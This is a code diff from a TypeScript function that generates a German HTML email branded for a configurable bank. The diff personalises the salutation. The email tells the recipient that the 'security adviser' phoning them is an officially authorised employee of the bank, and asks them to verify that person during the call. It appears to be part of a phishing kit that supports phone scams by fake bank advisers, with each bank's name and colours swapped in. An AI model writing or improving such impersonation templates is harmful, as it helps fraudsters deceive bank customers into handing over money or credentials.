@@ -138,7 +138,7 @@ function legitimierungTemplate(b: BankConfig): string {
         <tr><td style="height:3px;background-color:${b.topbar};font-size:0;line-height:0;">&nbsp;</td></tr>
         <tr><td style="padding:35px 40px 30px 40px;">
           <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">Legitimierung Ihres Sicherheitsberaters</h1>
-          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Sehr geehrte Damen und Herren,</p>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">{{ANREDE_SATZ}}</p>
           <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">zur Ihrer Sicherheit best&auml;tigen wir Ihnen hiermit schriftlich, dass der Sie derzeit telefonisch kontaktierende Sicherheitsberater ein <strong>offiziell autorisierter Mitarbeiter</strong> der ${b.fullName} ist. Bitte gleichen Sie die untenstehenden Legitimierungsdaten w&auml;hrend des Gespr&auml;chs mit Ihrem Berater ab.</p>
           <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;"><tr>
             <td style="background-color:#f1f4f7;border-left:4px solid ${b.border};border-radius:0 6px 6px 0;padding:20px 24px;">
